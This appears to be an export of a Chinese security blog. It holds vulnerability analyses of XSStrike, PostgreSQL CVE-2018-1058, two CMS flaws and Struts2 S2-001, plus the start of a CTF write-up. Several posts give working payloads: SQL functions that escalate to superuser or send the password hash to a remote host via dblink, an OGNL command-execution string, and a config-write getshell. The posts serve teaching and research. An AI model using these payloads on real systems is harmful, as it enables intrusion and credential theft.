str(e)来获得输出点的位置。 在html解析中，输出点主要分为以下几类： comment script attr html_data start_end_tag_attr test_param_check() - 检查返回值test_param_check()定义在 296 行，用于在注入特殊字符串（包括比如引号测试，payload测试）后，根据页面返回信息来确定是否xss成功。 12345678910111213141516171819202122232425def test_param_check(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, param_data, GET, POST, action): check_string = 'XSSSTART' + payload_to_check + 'XSSEND' # We are adding XSSSTART and XSSEND to make compare_string = 'XSSSTART' + payload_to_compare + 'XSSEND' # the payload distinguishable in the response param_data_injected = param_data.replace(xsschecker, check_string) try: check_response = make_request(url, param_data_injected, GET, POST) except: check_response = '' success = False occurence_counter = 0 # Variable to keep track of which reflection is going through the loop # Itretating over the reflections for m in re.finditer('XSSSTART', check_response, re.IGNORECASE): occurence_counter = occurence_counter + 1 efficiency = fuzz.partial_ratio(check_response[m.start():m.start()+len(compare_string)].lower(), compare_string.lower()) if efficiency == 100: if action == 'do': ... if occurence_counter == OCCURENCE_NUM: success = True break if efficiency &gt; 90: if action == 'do': ... return success check_string是发送的payload，由于要在网络中传输，因此一般会经过url编码。compare_string是页面返回html中期望看到的payload本身。这两个变量头尾都加上了XSSSTART和XSSEND，这是为了后续定位检测的方便。 在定位到输出点后，使用了fuzz.partial_ratio()来计算字符串的相似度，来测试xss是否成功过。 根据官网的信息，里面是这么描述XSStrike的：1But is XSS about copy pasting payloads? No. That&apos;s why XSStrike uses context breaking technique to automatically generate payloads and then uses levensthian algorithm to look for the payload in the web page to avoid false positives/negatives. 所以levensthian algorithm即为partial_ratio()。。 总结XSStrike的运行流程归结如下： 程序初始化 input() 程序入口 param_parser() 参数解析 initiator() xss扫描 paramfinder() 查询隐藏参数 GET/POST WAF_detector() WAF检测 有无WAF 有 fuzzer() 无 filter_checker() locater() scan_occurence() inject() test_param_check() 特殊字符检测 test_param_check() payload注入检测1 手动检测]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】]]></title>
      <url>%2F2018%2F03%2F06%2FPostgreSQL-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E2%80%94%E3%80%90CVE-2018-1058%E3%80%91%2F</url>
      <content type="text"><![CDATA[PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】 首发于： PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】 漏洞描述 A flaw was found in the way Postgresql allowed a user to modify the behavior of a query for other users. An attacker with a user account could use this flaw to execute code with the permissions of superuser in the database. Versions 9.3 through 10 are affected. 漏洞影响版本：https://www.securityfocus.com/bid/103221 基本环境搭建PostgreSQL(win平台)下载地址： PostgreSQL-9.6.7 123456$ psql -U postgrespostgres=# CREATE DATABASE evil;postgres=# CREATE USER chybeta WITH PASSWORD &apos;chybeta&apos;;CREATE ROLEpostgres=# GRANT ALL PRIVILEGES ON DATABASE evil to chybeta;GRANT 基本环境如下：123超级用户：postgres普通用户：chybeta数据库： evil 漏洞分析/利用基本场景先看一些基本场景。普通用户chybeta登陆：1$ psql -U chybeta -d evil 通过SELECT SESSION_USER;获知当前的会话用户： 我们在public模式中创建一张表以及对应的字段:12evil=&gt; SELECT 1 紧接着进行查询:1evil=&gt; SELECT * FROM test; 接着我们新创建一个模式（schema），其模式名即为chybeta，也即当前的SESSION_USER：1evil=&gt; CREATE schema chybeta; 然后在chybeta模式中创建对应的表以及字段:1evil=&gt; CREATE TABLE chybeta.test AS SELECT &apos;i am chybeta&apos;::text AS test; 然后我们执行跟上次相同的查询语句:1evil=&gt; SELECT * FROM test; 为什么两次查询出现了不同的结果呢？这个涉及到PostgreSQL的search_path。PostgreSQL 7.3后引入了schema的概念，称之为模式或者架构，允许用户在独立的命名空间中创建不同的对象（比如table，function）。在默认情况下，比如刚刚创建的一个数据库，都会有默认的一个public模式，在不做其他操作或者设定的情况下，诸如查询等操作都是在这个public中进行查询。 比如说:1SELECT * FROM test; 也即等价于:1SELECT * FROM public.test; 由于采用了独立的命名空间，因此在用户进行查询时，倘若涉及到对相同名字但在不同schema中的对象操作时，必然需要考虑一定的顺序。在PostgreSQL 9.6.7的官方文档中，search_path (string)说明了相关场景中的相应匹配动作，截取部分如下:12345When there are objects of identical names in different schemas, the one found first in the search path is used.If one of the list items is the special name $user, then the schema having the name returned by SESSION_USER is substituted, if there is such a schema and the user has USAGE permission for it. (If not, $user is ignored.)The system catalog schema, pg_catalog, is always searched, whether it is mentioned in the path or not. If it is mentioned in the path then it will be searched in the specified order. If pg_catalog is not in the path then it will be searched before searching any of the path items. 即： 首先适配原则，第一个找到的object被使用 名为$user的schema由SESSION_USER决定 如果pg_catalog不在path中则会最先查找它，如果在path中则按照指定顺序查找 第1、2点即如前面所示，但PostgreSQL在对第3点的实现上出现了Design Error(securityfocus的分类)，造成了代码执行漏洞。 利用方式在Postgres的commit记录中，有如下commit:123456789As special exceptions, the following client applications behave as documentedregardless of search_path settings and schema privileges: clusterdbcreatedb createlang createuser dropdb droplang dropuser ecpg (notprograms it generates) initdb oid2name pg_archivecleanup pg_basebackuppg_config pg_controldata pg_ctl pg_dump pg_dumpall pg_isreadypg_receivewal pg_recvlogical pg_resetwal pg_restore pg_rewind pg_standbypg_test_fsync pg_test_timing pg_upgrade pg_waldump reindexdb vacuumdbvacuumlo. Not included are core client programs that run user-specifiedSQL commands, namely psql and pgbench. 上面的commit提到了两类的client applications。下文的较为直观的利用方式一是针对第二类client applications（比如psql），然后利用方式二是通过第一类client applications来执行任意代码，相比较下更为隐蔽。 利用方式一在系统schemapg_catalog中，定义了大量的函数，用pgAdmin3查看: 以函数abs系列为例，接受一个类型为bigint\smallint\intger\real\double precision\numeric的参数，返回其绝对值。倘若我们传送一个非数值类型的参数呢，比如text，1evil=&gt; select abs(&apos;chybeta&apos;); 由于并没有参数类型为text的abs函数，会直接报错： 但postgres提供了自定义函数的功能！我们创建如下函数：123CREATE FUNCTION public.abs(TEXT) RETURNS TEXT AS $$ SELECT &apos;you are hacked by &apos; || $1;$$ LANGUAGE SQL IMMUTABLE; 当我们再次执行同样的查询语句，根据postgres的设计流程，它会先去查找系统schemapg_catalog，但由于参数类型不同没有找到，接着按照search_path中的顺序查找，而我们定义的abs(text)存在于schemapublic中，参数符合，因此pg理所当然地执行了我们定义的函数: 注意一个点，这个函数是定义在schemapublic中的，也就是说对于进入到这个数据库的任何用户，只要他们调用了abs，且参数为text，都有可能会诱发恶意的代码执行。比如以超级用户postgres执行: 不过有谁会傻乎乎的去运行一个莫名其妙的abs(text)呢？因此真正的攻击手段是将过程隐藏到看似正常的数据库查询中。这次我们选择schemapg_catalog中的另外一类函数比如lower(text)，upper(text)，它们分别将text类型的参数转成小写和大写，不过系统没有提供接受varchar参数的lower和upper，尽管可以进行类型转换，但对pg而言，最好的选择当然是参数类型恰好符合的恶意自定义函数。 创建一个表，值的类型为varchar：1CREATE TABLE public.hahahaha AS SELECT &apos;CHYBETA&apos;::varchar AS contents; 创建对应的恶意函数:123CREATE FUNCTION public.lower(varchar) RETURNS TEXT AS $$ SELECT &apos;you are hacked by &apos; || $1;$$ LANGUAGE SQL IMMUTABLE; 对绝大部分用户而言，他们可能看大写的CHYBETA不爽，然后执行了lower函数，但在不知道/清楚类型的情况下，他们执行的是public中的恶意自定义函数。 只能打印you are hacked by XXX有毛用！！由于恶意自定义函数可以被超级用户调用到，因此也就有了相应的执行权限，最简单的比如提权。 先来看看权限情况（以超级用户为例），可以看到只有postgres的rolsuper是t，即true: 在用户chybeta登陆进evil数据库后，他创建了如下upper函数:1234CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$ ALTER ROLE chybeta SUPERUSER; SELECT pg_catalog.upper($1);$$ LANGUAGE SQL VOLATILE; 注意这里是VOLATILE，具体原因参考 官方文档:xfunc-volatility 另外一张table，小写的chybeta:1CREATE TABLE public.hehehehe AS SELECT &apos;chybeta&apos;::varchar AS contents; 管理员一看，心中不爽：小写小写就知道小写，然后: 看上去一切正常，大写的大写。回到用户chybeta处，查看一下权限: 已经成为超级用户。 利用方法有很多，理论上只要能创建恶意函数，管理员调用，就是以管理员身份去执行恶意sql语句/代码。在这种情况中，如commit所说Not included are core client programs that run user-specified SQL commands, namely psql and pgbench.，被攻击用户是知道自己执行的sql语句，只是其中的某个function意义被掉包了。 利用方式二安装完PostgreSQL后还会有一系列的工具，比如pg_dump、pg_dumpall等等。基于利用方式一，在创建了恶意函数的基础之上，可以通过这些工具来执行恶意函数。这些工具在执行过程中会动态设定search_path，导致public的优先级比pg_catalog高，也就是说即使是在相同类型相同参数相同函数名的情况下，会选择public中的函数。相比第一种而言隐蔽性更强，同时有更高的可触发性。 为利用pg_dump中的sql语句，可以利用log来观察执行过程。在superuser的权限下show log_directory;找到log目录，将目录下postgresql.conf中的约莫455行改为log_statement = all。重启PostgreSQL后，使用pg_dump工具执行备份命令:1pg_dump -U postgres -f evil.bak evil 同时观察log输出，查找statement: SET search_path =，最后在某处我发现了一段这样的log: 可以看到在这段log中，有一处的array_to_string是没有指定schema的。在系统schema中它的定义如下： 在这里由于已经设定了search_path，为了能直接适配，这里创建的恶意函数的参数个数和类型都必须和pg_catalog中定义的相同，倘若不同则会按顺序匹配到正确的函数。 因为pg_dump在运行过程中开启的是read only transaction，根据官方文档：1The transaction access mode determines whether the transaction is read/write or read-only. Read/write is the default. When a transaction is read-only, the following SQL commands are disallowed: INSERT, UPDATE, DELETE, and COPY FROM if the table they would write to is not a temporary table; all CREATE, ALTER, and DROP commands; COMMENT, GRANT, REVOKE, TRUNCATE; and EXPLAIN ANALYZE and EXECUTE if the command they would execute is among those listed. This is a high-level notion of read-only that does not prevent all writes to disk. 是不允许执行下类操作的: INSERT, UPDATE, DELETE, COPY FROM all CREATE, ALTER, and DROP commands COMMENT, GRANT, REVOKE, TRUNCATE; and EXPLAIN ANALYZE and EXECUTE if the command they would execute is among those listed 不过并没有禁止select语句。如果开启了dblink，则可以利用查询来带出数据，比如用dblink_connect。因此我们创建这样的一个恶意函数：1234CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$ select dblink_connect((select &apos;hostaddr=192.168.248.132 port=12345 user=postgres password=chybeta sslmode=disable dbname=&apos;||(SELECT passwd FROM pg_shadow WHERE usename=&apos;postgres&apos;))); SELECT pg_catalog.array_to_string($1,$2);$$ LANGUAGE SQL VOLATILE; 远程vps上监听：1nc -lvv 12345 当管理员进行数据库备份时：1pg_dump -U postgres -f evil.bak evil 即可得到管理员密码： 漏洞修补以下版本修复了该漏洞1234PostgreSQL PostgreSQL 9.6.8 PostgreSQL PostgreSQL 9.5.12 PostgreSQL PostgreSQL 9.4.17 PostgreSQL PostgreSQL 9.3.22]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[某CMS 5.X版本 管理员密码重置漏洞]]></title>
      <url>%2F2018%2F03%2F05%2F%E6%9F%90CMS-5-X%E7%89%88%E6%9C%AC-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[某CMS 5.X版本 管理员密码重置漏洞 首发于: 某CMS 5.X版本 管理员密码重置漏洞 0x00 前言蹭一下某CMS 5.X版本GETSHELL漏洞合集的热点。 0x01 漏洞分析在 admin/admin/getpassword.php 中包含了 admin/include/common.inc.php 。跟入common.inc.php，第77行:123456foreach(array('_COOKIE', '_POST', '_GET') as $_request) &#123; foreach($$_request as $_key =&gt; $_value) &#123; $_key&#123;0&#125; != '_' &amp;&amp; $$_key = daddslashes($_value,0,0,1); $_M['form'][$_key]=daddslashes($_value,0,0,1); &#125;&#125; 这里存在变量覆盖漏洞。 回到 admin/admin/getpassword.php ，从第 94 行开始是发送重置密码链接邮箱的处理过程： 从数据库中取出管理员的信息 生成密码重置链接 发送密码重置链接 在发送阶段，admin/admin/getpassword.php 第 143 行:123456789require_once ROOTPATH.'include/jmail.php';$sendMail=jmailsend($from,$fromname,$to,$title,$body,$usename,$usepassword,$smtp);if($sendMail==0)&#123; require_once ROOTPATH.'include/export.func.php'; $post=array('to'=&gt;$to,'title'=&gt;$title,'body'=&gt;$body); $met_file='/passwordmail.php'; $sendMail=curl_post($post,30); if($sendMail=='nohost')$sendMail=0;&#125; 先来看看当$sendMail==0时的情况，此时会将所需信息整合为变量$post，之后调用curl_post发送。curl_post定义在 include/export.func.php:123456789101112131415161718192021222324252627282930313233343536373839404142function curl_post($post,$timeout)&#123;global $met_weburl,$met_host,$met_file;$host=$met_host;$file=$met_file; if(get_extension_funcs('curl')&amp;&amp;function_exists('curl_init')&amp;&amp;function_exists('curl_setopt')&amp;&amp;function_exists('curl_exec')&amp;&amp;function_exists('curl_close'))&#123; $curlHandle=curl_init(); curl_setopt($curlHandle,CURLOPT_URL,'http://'.$host.$file); curl_setopt($curlHandle,CURLOPT_REFERER,$met_weburl); .... $result=curl_exec($curlHandle); curl_close($curlHandle); &#125; else&#123; if(function_exists('fsockopen')||function_exists('pfsockopen'))&#123; $post_data=$post; $post=''; @ini_set("default_socket_timeout",$timeout); while (list($k,$v) = each($post_data)) &#123; $post .= rawurlencode($k)."=".rawurlencode($v)."&amp;"; &#125; $post = substr( $post , 0 , -1 ); $len = strlen($post); if(function_exists(fsockopen))&#123; $fp = @fsockopen($host,80,$errno,$errstr,$timeout); &#125; else&#123; $fp = @pfsockopen($host,80,$errno,$errstr,$timeout); &#125; if (!$fp) &#123; $result=''; &#125; else &#123; $result = ''; $out = "POST $file HTTP/1.0\r\n"; $out .= "Host: $host\r\n"; $out .= "Referer: $met_weburl\r\n"; $out .= "Content-type: application/x-www-form-urlencoded\r\n"; $out .= "Connection: Close\r\n"; $out .= "Content-Length: $len\r\n"; $out .="\r\n"; $out .= $post."\r\n"; fwrite($fp, $out); 可以看到这里的$met_host操控了邮件内容的发送地点，而该参数可以利用前面的变量覆盖漏洞来进行直接的控制。 接着考虑如何让$sendMail==0。跟入jmailsend，include/jmail.php 第7行:12345678910111213141516171819202122232425function jmailsend($from,$fromname,$to,$title,$body,$usename,$usepassword,$smtp,$repto,$repname)&#123; global $met_fd_port,$met_fd_way; ... if(stripos($smtp,'.gmail.com')===false)&#123; $mail-&gt;Port = $met_fd_port; ... &#125; else&#123; $mail-&gt;Port = 465; ... &#125; ... if(!$mail-&gt;Send()) &#123; $mail-&gt;SmtpClose(); //return "Mailer Error: " . $mail-&gt;ErrorInfo; return false; &#125; else &#123; $mail-&gt;SmtpClose(); //return "Message sent!"; return true; &#125;&#125; met_fd_port指定了邮件发送端口，属于系统配置。因此倘若我们利用前面的变量覆盖漏洞修改端口，即可导致邮件发送失败，进入到curl_post。 0x02 漏洞复现因为使用curl_post中使用的是http协议，默认端口为80。因此在vps上监听80端口：1nc -lvv 80 在填入管理员密码或邮箱后，抓包修改数据： forward掉后， 0x03 漏洞补丁在6.0版本中，官方直接删除了该文件，简单粗暴。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[某CMS V5.7 SP2 后台Getshell]]></title>
      <url>%2F2018%2F02%2F27%2F%E6%9F%90CMS-V5-7-SP2-%E5%90%8E%E5%8F%B0Getshell%2F</url>
      <content type="text"><![CDATA[首发于:阿里先知安全社区：某CMS V5.7 SP2 后台Getshell dede/sys_info.php中1234567891011121314151617181920212223242526272829//保存配置的改动if($dopost=="save")&#123; if(!isset($token))&#123; echo 'No token found!'; exit; &#125; if(strcasecmp($token, $_SESSION['token']) != 0)&#123; echo 'Token mismatch!'; exit; &#125; foreach($_POST as $k=&gt;$v) &#123; if(preg_match("#^edit___#", $k)) &#123; $v = cn_substrR($&#123;$k&#125;, 1024); &#125; else &#123; continue; &#125; $k = preg_replace("#^edit___#", "", $k); $dsql-&gt;ExecuteNoneQuery("UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' "); &#125; ReWriteConfig(); ShowMsg("成功更改站点配置！", "sys_info.php"); exit();&#125; 在选择更改配置后，通过foreach($_POST as $k=&gt;$v)接受参数，并且将参数内容写入了数据库，之后进入ReWriteConfig();。 1234567891011121314151617181920212223242526272829//更新配置函数function ReWriteConfig()&#123; global $dsql,$configfile; if(!is_writeable($configfile)) &#123; echo "配置文件'&#123;$configfile&#125;'不支持写入，无法修改系统配置参数！"; exit(); &#125; $fp = fopen($configfile,'w'); flock($fp,3); fwrite($fp,"&lt;"."?php\r\n"); $dsql-&gt;SetQuery("SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC "); $dsql-&gt;Execute(); while($row = $dsql-&gt;GetArray()) &#123; if($row['type']=='number') &#123; if($row['value']=='') $row['value'] = 0; fwrite($fp,"\$&#123;$row['varname']&#125; = ".$row['value'].";\r\n"); &#125; else &#123; fwrite($fp,"\$&#123;$row['varname']&#125; = '".str_replace("'",'',$row['value'])."';\r\n"); &#125; &#125; fwrite($fp,"?"."&gt;"); fclose($fp);&#125; 这里的代码将前面插入数据库的数据直接取出，没有再做验证。在while($row = $dsql-&gt;GetArray())，有两个分支，当$row[&#39;type&#39;]==&#39;number&#39;时，会往文件中直接写入，其他情况下会进行一次str_replace(&quot;&#39;&quot;,&#39;&#39;,$row[&#39;value&#39;])将单引号替换掉。所以我们考虑使用第一个分支。 比如使用参数cfg_ftp_port，它表示采用的ftp端口 我们填入值为21;phpinfo(): Getshell： 查看配置文件 data/config.cache.inc.php]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[【struts2 命令/代码执行漏洞分析系列】S2-001]]></title>
      <url>%2F2018%2F02%2F06%2F%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001%2F</url>
      <content type="text"><![CDATA[首发于：阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-001 前言最近学习java安全，在分析s2-001的时候发现了一些问题和心得。一方面网上关于s2-001的漏洞分析很少，基本上都是poc+利用而已，另一方面在调试过程中感觉apache官方通告有不准确的地方，这点见后面的一点说明部分，有不准确的地方望各位师傅指出，谢谢。 漏洞信息漏洞信息页面： https://cwiki.apache.org/confluence/display/WW/S2-001 漏洞成因官方概述：Remote code exploit on form validation error 漏洞影响： WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8 环境搭建源码结构： 几个主要文件（待会用到）：index.jsp1234567891011121314&lt;html&gt;&lt;head&gt; &lt;title&gt;用户登录&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;用户登录&lt;/h1&gt;&lt;s:form action="login"&gt; &lt;s:textfield name="username" label="username" /&gt; &lt;s:textfield name="password" label="password" /&gt; &lt;s:submit&gt;&lt;/s:submit&gt;&lt;/s:form&gt;&lt;/body&gt;&lt;/html&gt; struts.xml:12345678910111213&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE struts PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN" "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;&lt;struts&gt; &lt;package name="s2-001" extends="struts-default"&gt; &lt;action name="login" class="com.test.LoginAction"&gt; &lt;result name="success"&gt;/success.jsp&lt;/result&gt; &lt;result name="error"&gt;/index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; web.xml:12345678910111213141516171819&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1"&gt; &lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; 完整源码见附件。 漏洞利用最简单poc：1%&#123;1+1&#125; 任意命令执行:1%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 将new java.lang.String[]{&quot;pwd&quot;})中的pwd替换为对应的命令，即可执行。 漏洞分析在经过tomcat容器的处理后，http请求会到达struts2，从这里开始调试吧。 在 /com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:158 接受我们输入的参数值，之后会调用对应的set方法(这个省略)：1234 ValueStack stack = ac.getValueStack(); setParameters(action, stack, parameters);&#125; finally &#123; 继续执行，执行完interceptor部分，也即对return invocation.invoke();进行step over，到达/com/opensymphony/xwork2/DefaultActionInvocation.java:252 跟进executeResult()，到达 /com/opensymphony/xwork2/DefaultActionInvocation.java:343 跟进result.execute(this)，到达 /org/apache/struts2/dispatcher/StrutsResultSupport.java:175： 此后在dispatcher.forward(request, response);跟进，此处省略一些过程，相关调用栈如下： 进入 /org/apache/struts2/views/jsp/ComponentTagSupport.java:47， 这里会对jsp标签进行解析，但这时的标签并不包含我们的payload，我们可以在这里step over，直到解析到对应的标签： 如上图，我们提交的password值为%{1+1}，因此着重关注对&lt;s:textfield name=&quot;password&quot; label=&quot;password&quot; /&gt;解析。回到doStartTag，执行完后会再次回到index.jsp，此时遇到了相应的闭合标签/&gt;，会跳转到doEndTag:12345public int doEndTag() throws JspException &#123; component.end(pageContext.getOut(), getBody()); component = null; return EVAL_PAGE;&#125; 跟进component.end()，到达 /org/apache/struts2/components/UIBean.java:486： 跟入evaluateParams后一直执行到如下图 由于开启了altSyntax，expr变为为%{password} 跟入addParameter(&quot;nameValue&quot;, findValue(expr, valueClazz));中的findValue，来到 /org/apache/struts2/components/Component.java:3181234protected Object findValue(String expr, Class toType) &#123; if (altSyntax() &amp;&amp; toType == String.class) &#123; return TextParseUtil.translateVariables('%', expr, stack); &#125; 开启了altSyntax且toType为class.java.lang.string，跟入TextParseUtil.translateVariables，在/com/opensymphony/xwork2/util/TextParseUtil.java: 123public static String translateVariables(char open, String expression, ValueStack stack) &#123; return translateVariables(open, expression, stack, String.class, null).toString();&#125; 继续跟入translateVariables，源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) &#123; // deal with the "pure" expressions first! //expression = expression.trim(); Object result = expression; while (true) &#123; int start = expression.indexOf(open + "&#123;"); int length = expression.length(); int x = start + 2; int end; char c; int count = 1; while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123; c = expression.charAt(x++); if (c == '&#123;') &#123; count++; &#125; else if (c == '&#125;') &#123; count--; &#125; &#125; end = x - 1; if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123; String var = expression.substring(start + 2, end); Object o = stack.findValue(var, asType); if (evaluator != null) &#123; o = evaluator.evaluate(o); &#125; String left = expression.substring(0, start); String right = expression.substring(end + 1); if (o != null) &#123; if (TextUtils.stringSet(left)) &#123; result = left + o; &#125; else &#123; result = o; &#125; if (TextUtils.stringSet(right)) &#123; result = result + right; &#125; expression = left + o + right; &#125; else &#123; // the variable doesn't exist, so don't display anything result = left + right; expression = left + right; &#125; &#125; else &#123; break; &#125; &#125; return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);&#125; 此时expression为%{password} 经过while循环，确定start和end定位后，此时var为password，到达： stack.findValue(var, asType);会返回password的值%{1+1}，这个就是我们传入的payload： 此后o为%{1+1}，再对o进行了一番处理后，payload经过result变量，最终成为expression的值： 在完成后，进入下一个循环： 并且在Object o = stack.findValue(var, asType);中完成了对payload的执行 因此究其原因，在于在translateVariables中，递归解析了表达式，在处理完%{password}后将password的值直接取出并继续在while循环中解析，若用户输入的password是恶意的ognl表达式，比如%{1+1}，则得以解析执行。 漏洞修复XWork 2.0.4中，改变了ognl表达式的解析方法从而不会产生递归解析，用户的输入也不会再解析执行。 对应源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) &#123; // deal with the "pure" expressions first! //expression = expression.trim(); Object result = expression; int loopCount = 1; int pos = 0; while (true) &#123; int start = expression.indexOf(open + "&#123;", pos); if (start == -1) &#123; pos = 0; loopCount++; start = expression.indexOf(open + "&#123;"); &#125; if (loopCount &gt; maxLoopCount) &#123; // translateVariables prevent infinite loop / expression recursive evaluation break; &#125; int length = expression.length(); int x = start + 2; int end; char c; int count = 1; while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123; c = expression.charAt(x++); if (c == '&#123;') &#123; count++; &#125; else if (c == '&#125;') &#123; count--; &#125; &#125; end = x - 1; if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123; String var = expression.substring(start + 2, end); Object o = stack.findValue(var, asType); if (evaluator != null) &#123; o = evaluator.evaluate(o); &#125; String left = expression.substring(0, start); String right = expression.substring(end + 1); String middle = null; if (o != null) &#123; middle = o.toString(); if (!TextUtils.stringSet(left)) &#123; result = o; &#125; else &#123; result = left + middle; &#125; if (TextUtils.stringSet(right)) &#123; result = result + right; &#125; expression = left + middle + right; &#125; else &#123; // the variable doesn't exist, so don't display anything result = left + right; expression = left + right; &#125; pos = (left != null &amp;&amp; left.length() &gt; 0 ? left.length() - 1: 0) + (middle != null &amp;&amp; middle.length() &gt; 0 ? middle.length() - 1: 0) + 1; pos = Math.max(pos, 1); &#125; else &#123; break; &#125; &#125; return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);&#125; 当解析完一层表达式后，如图，此时loopCount &gt; maxLoopCount，从而执行break，不再继续解析%{1+1}: diff的结果如下： 一个说明回到漏洞信息和开头环境搭建部分，漏洞信息中的图有画上了几个红圈。基于此问一个问题：表单验证错误是在哪里触发的？ 查阅apache2官方文档(https://struts.apache.org/core-developers/validation.html)提到 就本次测试源码而言，并没有相应的validation.xml或其他validation方法。为更直观起见，我们修改LoginAction.java源码：12345678910111213141516public void setPassword(String password) &#123; this.password = "%&#123;1+1&#125;";&#125;public void setUsername(String username) &#123; this.username = "chybeta";&#125;@Overridepublic String execute() throws Exception &#123; if (username.equals("chybeta") ) &#123; return "error"; &#125; else &#123; return "success"; &#125;&#125; 当submit时，会执行相应的set方法，直接设置username和password分别为chybeta与%{1+1}。修改后的源码中的execute方法中若username为chybeta则返回error，根据struts.xml配置文件，当返回error时，会返回index.jsp，即这里不算存在逻辑上的验证错误，因为username被硬编码为chybeta了，username.equals(&quot;chybeta&quot;)恒成立。 所以这里没有涉及到我们传入的参数，不存在表单验证失败，也不存在逻辑上的验证失败。执行poc如下： 所以可以说表单验证错误并不是该漏洞的产生的原因，但表单验证错误是这个漏洞出现的场景之一。在struts2框架中，配置了Validation，倘若验证出错会往往会原样返回用户输入的值而且不会跳转到新的页面，而在最后解析页面时区解析了用户输入的值，从而执行payload。在实际场景中，比如登陆等处，往往会配置了Validation，比如限制用户名长度，数字的范围等等，从而成为了该漏洞的高发区。 以struts2的showcase为例： 在本测试环境的源码中，没有表单验证，但同样把用户的输入留在了页面里，从而在解析的时候执行了。 Refference https://cwiki.apache.org/confluence/display/WW/S2-001 https://github.com/vulhub/vulhub/tree/master/struts2/s2-001 http://www.freebuf.com/column/156344.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AceBear Security Contest-Tet shopping-writeup]]></title>
      <url>%2F2018%2F01%2F31%2FAceBear-Security-Contest-Tet-shopping-writeup%2F</url>
      <content type="text"><![CDATA[本文首发于：阿里先知安全社区：AceBear Security Contest-Tet shopping-writeup 前言这几天研究了一下AceBear Security Contest的Tet shopping题目，整体思路以及涉及的知识点如下： 格式化字符串sql注入漏洞 基于gopher协议的SSRF攻击来完成对mysql未授权访问漏洞的利用 时间盲注 题目12Website: Link http://128.199.179.156/Source: source http://128.199.179.156/src.tar.gz Solution基本功能点开链接，发现有一个登陆框，提供了注册和登陆功能。 完成注册和登陆后，发现有购物功能，你可以买Banh chung或者Banh tet，购买完后会出现下图中的红框框起部分： 接下里看源码。源码大体结构如下，img文件夹里存放了图片，backup.sh是脚本文件，里面涉及了mysql操作和flag的保存，具体内容见后。cfg.php文件主要定义了sql操作比如查询等等，db.sql是sql文件，func.php包含有功能比如购买等等，index.php即主页，info.php用来显示每样物品的具体信息，item.php显示购买信息，login.php和logout.php分别是登陆与登出：123456789101112131415│ backup.sh│ cfg.php│ db.sql│ func.php│ index.php│ info.php│ item.php│ login.php│ logout.php│ ok.jpg│└─img banh-chung-22.jpg banh_chung.jpg banh_tet.jpg 由于初次点开，会直接跳转到login.php进行注册和登陆，因此我们先来看看 